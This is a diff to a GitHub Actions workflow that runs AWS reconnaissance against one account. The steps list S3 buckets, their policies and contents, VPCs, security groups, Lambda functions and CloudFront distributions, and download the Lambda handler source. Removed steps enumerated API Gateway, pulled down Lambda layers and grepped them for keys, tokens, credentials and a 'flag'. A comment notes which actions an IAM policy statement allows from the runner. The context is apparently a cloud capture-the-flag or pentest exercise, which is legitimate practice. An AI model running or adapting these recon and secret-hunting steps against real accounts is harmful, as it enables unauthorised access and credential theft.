@@ -20,22 +20,37 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Describe VPC
-        continue-on-error: true
-        run: |
-          echo "===== VPC ====="
-          aws ec2 describe-vpcs --vpc-ids vpc-09328d3fa21dce320
+      # ===== Everything below is confirmed allowed by Statement2 =====
+      # (no aws:SourceVpc condition - works from the GitHub runner)
 
-      - name: Get Lambda code location and download source
-        continue-on-error: true
+      - name: List S3 buckets and their policies/contents
         run: |
+          echo "===== S3 BUCKETS ====="
+          aws s3 ls
+          echo "===== BUCKET DETAILS ====="
+          for BUCKET in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
+            echo "### $BUCKET"
+            aws s3api get-bucket-policy --bucket "$BUCKET" --query Policy --output text 2>&1
+            aws s3 ls "s3://$BUCKET" --recursive
+          done
+
+      - name: Describe VPCs and security groups
+        run: |
+          echo "===== VPCs ====="
+          aws ec2 describe-vpcs
+          echo "===== SECURITY GROUPS ====="
+          aws ec2 describe-security-groups
+
+      - name: Lambda - list functions and get details
+        run: |
+          echo "===== LAMBDA FUNCTIONS ====="
+          aws lambda list-functions
           echo "===== LAMBDA CODE LOCATION ====="
           URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
           echo "$URL"
           curl -sL "$URL" -o code.zip
 
-      - name: Unzip and show handler
-        continue-on-error: true
+      - name: Unzip and show handler source
         run: |
           mkdir -p extracted
           unzip -o code.zip -d extracted
@@ -44,98 +59,19 @@ jobs:
           echo "===== lambda_function.py ====="
           cat extracted/lambda_function.py || true
 
-      - name: Check resource-based policy on the Lambda itself
-        continue-on-error: true
+      - name: Lambda - resource-based (invoke) policy
         run: |
           echo "===== LAMBDA RESOURCE POLICY ====="
           aws lambda get-policy --function-name nslookupv2
 
-      # ===== API Gateway enumeration =====
-
-      - name: API Gateway - get resources (all paths/methods)
-        continue-on-error: true
+      - name: CloudFront distributions
         run: |
-          echo "===== API GATEWAY RESOURCES =====" 
-          aws apigateway get-resources --rest-api-id 3q931syi7b
+          echo "===== CLOUDFRONT DISTRIBUTIONS ====="
+          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origin:Origins.Items[0].DomainName}' --output table
+          echo "===== SITE DISTRIBUTION DETAIL ====="
+          aws cloudfront get-distribution --id EKD9KH16RB5G3
 
-      - name: API Gateway - get stages
-        continue-on-error: true
-        run: |
-          echo "===== API GATEWAY STAGES ====="
-          aws apigateway get-stages --rest-api-id 3q931syi7b
-
-      - name: API Gateway - get dev stage detail
-        continue-on-error: true
-        run: |
-          echo "===== API GATEWAY STAGE: dev ====="
-          aws apigateway get-stage --rest-api-id 3q931syi7b --stage-name dev
-
-      - name: API Gateway - export swagger spec
-        continue-on-error: true
-        run: |
-          echo "===== API GATEWAY SWAGGER EXPORT ====="
-          aws apigateway get-export \
-            --rest-api-id 3q931syi7b \
-            --stage-name dev \
-            --export-type swagger swagger.json
-          cat swagger.json 2>/dev/null || true
-
-      - name: API Gateway - list deployments
-        continue-on-error: true
-        run: |
-          echo "===== API GATEWAY DEPLOYMENTS ====="
-          aws apigateway get-deployments --rest-api-id 3q931syi7b
-
-      # ===== Lambda Layer extraction =====
-
-      - name: Get aws_cli_layer content
-        continue-on-error: true
-        run: |
-          echo "===== aws_cli_layer VERSION INFO ====="
-          aws lambda get-layer-version --layer-name aws_cli_layer --version-number 8
-          echo "===== Downloading aws_cli_layer content ====="
-          URL=$(aws lambda get-layer-version --layer-name aws_cli_layer --version-number 8 --query 'Content.Location' --output text)
-          curl -sL "$URL" -o aws_cli_layer.zip
-          mkdir -p aws_cli_layer_extracted
-          unzip -o aws_cli_layer.zip -d aws_cli_layer_extracted >/dev/null
-          echo "===== aws_cli_layer FILES ====="
-          find aws_cli_layer_extracted -maxdepth 4 -type f | head -100
-
-      - name: Get nslookup_layer content
-        continue-on-error: true
-        run: |
-          echo "===== nslookup_layer VERSION INFO ====="
-          aws lambda get-layer-version --layer-name nslookup_layer --version-number 8
-          echo "===== Downloading nslookup_layer content ====="
-          URL=$(aws lambda get-layer-version --layer-name nslookup_layer --version-number 8 --query 'Content.Location' --output text)
-          curl -sL "$URL" -o nslookup_layer.zip
-          mkdir -p nslookup_layer_extracted
-          unzip -o nslookup_layer.zip -d nslookup_layer_extracted >/dev/null
-          echo "===== nslookup_layer FILES ====="
-          find nslookup_layer_extracted -maxdepth 4 -type f | head -100
-
-      - name: Search extracted layers for secrets/scripts
-        continue-on-error: true
-        run: |
-          echo "===== Grepping layer contents for interesting strings ====="
-          grep -r -i -E "secret|password|key|token|AKIA|aws_access|aws_secret|flag|credential" \
-            aws_cli_layer_extracted nslookup_layer_extracted 2>/dev/null | head -100
-          echo "===== Listing any scripts (.sh, .py) in layers ====="
-          find aws_cli_layer_extracted nslookup_layer_extracted -type f \( -name "*.sh" -o -name "*.py" \) 2>/dev/null
-
-      # ===== CodeBuild recon =====
-
-      - name: CodeBuild - list and describe projects
-        continue-on-error: true
-        run: |
-          echo "===== CODEBUILD PROJECTS ====="
-          aws codebuild list-projects
-          PROJECTS=$(aws codebuild list-projects --query 'projects[]' --output text 2>/dev/null)
-          if [[ -n "$PROJECTS" ]]; then
-            aws codebuild batch-get-projects --names $PROJECTS
-          fi
-
-      - name: Upload all artifacts
+      - name: Upload artifacts
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -143,7 +79,4 @@ jobs:
           path: |
             code.zip
             extracted/
-            swagger.json
-            aws_cli_layer_extracted/
-            nslookup_layer_extracted/
           if-no-files-found: ignore
